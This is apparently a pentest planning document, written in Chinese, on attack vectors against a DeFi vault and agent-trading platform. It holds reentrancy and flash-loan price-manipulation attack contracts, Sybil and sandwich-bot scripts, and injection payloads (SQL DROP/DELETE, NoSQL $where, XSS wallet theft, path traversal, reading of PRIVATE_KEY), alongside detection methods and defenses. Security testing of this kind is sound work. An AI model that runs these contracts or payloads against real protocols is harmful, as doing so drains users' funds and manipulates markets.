# Terminal Markets 智能合约攻击向量详解

## 🎯 攻击向量矩阵

### Vector 1: Vault Reentrancy Attack
**难度**: ⭐⭐⭐⭐ (高)  
**影响**: 💰💰💰💰💰 (资金损失)

#### 攻击原理
```solidity
// 假设的漏洞代码
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount);
    
    // 漏洞：在更新状态前进行外部调用
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success);
    
    balances[msg.sender] -= amount; // 状态更新太晚
}
```

#### 攻击合约示例
```solidity
contract VaultAttacker {
    IVault public vault;
    uint256 public attackCount;
    
    constructor(address _vault) {
        vault = IVault(_vault);
    }
    
    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }
    
    receive() external payable {
        if (attackCount < 10 && address(vault).balance > 0) {
            attackCount++;
            vault.withdraw(msg.value);
        }
    }
}
```

#### 检测方法
1. 使用Slither检测: `slither . --detect reentrancy-eth`
2. 手动审计：查找状态更新在外部调用之后的模式
3. 使用Echidna进行模糊测试

#### 防御措施
- 使用ReentrancyGuard
- 遵循Checks-Effects-Interactions模式
- 使用pull over push模式

---

### Vector 2: NFT Ownership Bypass
**难度**: ⭐⭐⭐ (中)  
**影响**: 💰💰💰💰 (未授权访问)

#### 攻击场景
```solidity
// 可能存在的漏洞
function createVault() external {
    // 弱验证：只检查余额而非真实所有权
    require(nftContract.balanceOf(msg.sender) > 0);
    
    // 攻击者可以：
    // 1. 闪电贷借NFT
    // 2. 创建vault
    // 3. 归还NFT
    // 4. 保留vault访问权
}
```

#### 利用步骤
1. 使用Aave/Uniswap闪电贷借入NFT
2. 在同一交易中调用createVault()
3. 归还NFT
4. 检查是否仍能控制vault

#### 测试代码
```javascript
// Hardhat测试
it("Should prevent flash loan NFT attack", async function() {
    // 1. 借入NFT
    await flashLoan.borrow(nftAddress, tokenId);
    
    // 2. 尝试创建vault
    await expect(
        terminal.createVault()
    ).to.be.revertedWith("Invalid NFT ownership");
    
    // 3. 归还NFT
    await flashLoan.repay(nftAddress, tokenId);
});
```

---

### Vector 3: Price Oracle Manipulation
**难度**: ⭐⭐⭐⭐⭐ (极高)  
**影响**: 💰💰💰💰💰 (市场操纵)

#### 攻击流程
```
1. 识别低流动性代币
2. 使用闪电贷获取大量ETH
3. 在DEX上大量买入目标代币
4. 触发代理交易（价格已被抬高）
5. 立即卖出代币
6. 归还闪电贷
7. 获利
```

#### 实战示例
```javascript
// 闪电贷攻击合约
contract PriceManipulator {
    function executeAttack(
        address token,
        uint256 loanAmount
    ) external {
        // 1. 借入闪电贷
        aave.flashLoan(address(this), weth, loanAmount, "");
    }
    
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // 2. 买入代币抬高价格
        uniswap.swapExactTokensForTokens(
            amount * 80 / 100,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        // 3. 等待代理交易执行
        // (代理会以高价买入)
        
        // 4. 卖出代币
        uniswap.swapExactTokensForTokens(
            token.balanceOf(address(this)),
            0,
            reversePath,
            address(this),
            block.timestamp
        );
        
        // 5. 归还贷款
        return true;
    }
}
```

#### 检测指标
- 价格波动超过10%在单个区块内
- 大额交易后立即反向交易
- 流动性突然增加后减少
- MEV机器人活动异常

---

### Vector 4: Strategy Injection
**难度**: ⭐⭐⭐ (中)  
**影响**: 💰💰💰 (代理行为异常)

#### 注入点
```javascript
// 前端代码可能的漏洞
function createStrategy(strategyText) {
    // 危险：直接使用用户输入
    const strategy = {
        name: strategyText,
        conditions: parseConditions(strategyText),
        actions: parseActions(strategyText)
    };
    
    // 如果解析器有漏洞，可能执行任意代码
    return strategy;
}
```

#### 恶意策略示例
```
策略名称: "Buy ETH"; DROP TABLE strategies; --
策略条件: {"$where": "this.balance > 0"}
策略动作: <script>stealWallet()</script>
```

#### 测试Payload
```json
{
  "strategy": {
    "name": "'; DELETE FROM vaults WHERE '1'='1",
    "conditions": {
      "$ne": null,
      "$where": "function() { return true; }"
    },
    "actions": [
      {
        "type": "trade",
        "token": "../../admin/withdraw",
        "amount": "{{process.env.PRIVATE_KEY}}"
      }
    ]
  }
}
```

---

### Vector 5: Front-Running Agent Trades
**难度**: ⭐⭐ (低)  
**影响**: 💰💰💰 (利润损失)

#### MEV攻击流程
```python
# MEV机器人伪代码
def monitor_mempool():
    for tx in pending_transactions:
        if is_agent_trade(tx):
            # 解析交易意图
            token, amount, slippage = parse_trade(tx)
            
            # 计算利润
            profit = calculate_sandwich_profit(token, amount)
            
            if profit > gas_cost * 2:
                # 发送front-run交易
                send_buy_tx(token, amount, higher_gas_price)
                
                # 等待原始交易执行
                wait_for_tx(tx)
                
                # 发送back-run交易
                send_sell_tx(token, amount, high_gas_price)
```

#### 防御策略
```solidity
// 使用Flashbots保护交易
function protectedTrade(
    address token,
    uint256 amount,
    uint256 minOutput
) external {
    // 1. 使用私有内存池
    // 2. 设置严格的滑点保护
    require(
        getAmountOut(token, amount) >= minOutput,
        "Slippage too high"
    );
    
    // 3. 使用时间锁
    require(
        block.timestamp >= lastTrade[msg.sender] + MIN_DELAY,
        "Too frequent"
    );
}
```

---

### Vector 6: Sybil Attack on Swarm Launch
**难度**: ⭐⭐ (低)  
**影响**: 💰💰💰💰 (不公平分配)

#### 攻击步骤
```
1. 准备100个钱包地址
2. 为每个钱包购买1个DX Terminal NFT
3. 为每个钱包创建vault并存入0.01 ETH
4. 在代币发行时，100个代理同时买入
5. 绕过单个代理0.01 ETH的限制
6. 总共买入1 ETH的代币
```

#### 自动化脚本
```javascript
// 批量创建vault和交易
const wallets = [];
for (let i = 0; i < 100; i++) {
    wallets.push(ethers.Wallet.createRandom());
}

async function sybilAttack() {
    // 1. 批量购买NFT
    for (const wallet of wallets) {
        await buyNFT(wallet.address);
    }
    
    // 2. 批量创建vault
    for (const wallet of wallets) {
        await createVault(wallet);
    }
    
    // 3. 在代币发行时同时交易
    const promises = wallets.map(wallet => 
        buyToken(wallet, "0.01 ETH")
    );
    await Promise.all(promises);
}
```

#### 检测方法
- 监控短时间内大量vault创建
- 检测相似的交易模式
- 分析钱包资金来源
- 识别批量操作特征

---

### Vector 7: Vault Ownership Transfer Exploit
**难度**: ⭐⭐⭐⭐ (高)  
**影响**: 💰💰💰💰💰 (完全控制)

#### 漏洞场景
```solidity
// 可能的漏洞代码
function transferVaultOwnership(address newOwner) external {
    require(msg.sender == vaultOwner[vaultId]);
    
    // 漏洞：没有验证newOwner是否持有NFT
    vaultOwner[vaultId] = newOwner;
    
    // 攻击者可以：
    // 1. 将vault转移给自己的另一个地址
    // 2. 卖掉NFT
    // 3. 仍然控制vault
}
```

#### 利用代码
```javascript
// 攻击流程
async function exploitOwnershipTransfer() {
    // 1. 购买NFT并创建vault
    await buyNFT();
    const vaultId = await createVault();
    
    // 2. 存入资金
    await deposit(vaultId, "10 ETH");
    
    // 3. 转移vault所有权到攻击者地址
    await transferOwnership(vaultId, attackerAddress);
    
    // 4. 卖掉NFT获利
    await sellNFT();
    
    // 5. 仍然可以控制vault
    await withdraw(vaultId, "10 ETH");
}
```

---

## 🔧 实战工具包

### 智能合约分析工具
```bash
# Slither - 静态分析
pip3 install slither-analyzer
slither . --detect all

# Mythril - 符号执行
pip3 install mythril
myth analyze contract.sol

# Echidna - 模糊测试
docker pull trailofbits/echidna
echidna-test contract.sol

# Manticore - 符号执行
pip3 install manticore
manticore contract.sol
```

### 链上监控脚本
```python
# monitor_base.py
from web3 import Web3
import json

# 连接Base网络
w3 = Web3(Web3.HTTPProvider('https://mainnet.base.org'))

# 监控vault创建事件
def monitor_vault_creation():
    # 获取最新区块
    latest_block = w3.eth.block_number
    
    # 监控事件
    event_filter = contract.events.VaultCreated.create_filter(
        fromBlock=latest_block
    )
    
    for event in event_filter.get_all_entries():
        print(f"New vault created: {event['args']}")
        analyze_vault(event['args']['vaultId'])

# 分析vault安全性
def analyze_vault(vault_id):
    balance = contract.functions.getVaultBalance(vault_id).call()
    owner = contract.functions.getVaultOwner(vault_id).call()
    
    print(f"Vault {vault_id}:")
    print(f"  Balance: {w3.from_wei(balance, 'ether')} ETH")
    print(f"  Owner: {owner}")
```

### MEV检测脚本
```javascript
// detect_mev.js
const { ethers } = require('ethers');

async function detectSandwich(txHash) {
    const provider = new ethers.providers.JsonRpcProvider(
        'https://mainnet.base.org'
    );
    
    const tx = await provider.getTransaction(txHash);
    const receipt = await provider.getTransactionReceipt(txHash);
    
    // 检查前后交易
    const block = await provider.getBlock(receipt.blockNumber);
    const txIndex = block.transactions.indexOf(txHash);
    
    const prevTx = block.transactions[txIndex - 1];
    const nextTx = block.transactions[txIndex + 1];
    
    // 分析是否为sandwich攻击
    if (isSandwich(prevTx, tx, nextTx)) {
        console.log(`Sandwich attack detected on ${txHash}`);
        return true;
    }
    
    return false;
}
```

---

## 📊 风险评估矩阵

| 攻击向量 | 可行性 | 影响 | 检测难度 | 优先级 |
|---------|--------|------|---------|--------|
| Reentrancy | 中 | 极高 | 低 | 🔴 P0 |
| NFT Bypass | 高 | 高 | 中 | 🔴 P0 |
| Price Manipulation | 中 | 极高 | 高 | 🔴 P0 |
| Strategy Injection | 高 | 中 | 低 | 🟠 P1 |
| Front-Running | 极高 | 中 | 中 | 🟠 P1 |
| Sybil Attack | 极高 | 高 | 低 | 🟠 P1 |
| Ownership Exploit | 低 | 极高 | 低 | 🔴 P0 |

---

## 🎯 渗透测试清单

### 准备阶段
- [ ] 获取测试NFT
- [ ] 准备测试钱包（至少5个）
- [ ] 获取测试ETH（Base Sepolia）
- [ ] 设置监控工具
- [ ] 准备攻击合约

### 执行阶段
- [ ] 测试vault创建流程
- [ ] 尝试NFT所有权绕过
- [ ] 测试重入攻击
- [ ] 执行价格操纵测试
- [ ] 测试策略注入
- [ ] 监控MEV活动
- [ ] 执行Sybil攻击模拟

### 报告阶段
- [ ] 记录所有发现
- [ ] 评估影响和可行性
- [ ] 提供修复建议
- [ ] 准备PoC代码
- [ ] 负责任披露

---

**最后更新**: 2026-03-01 14:50 EST
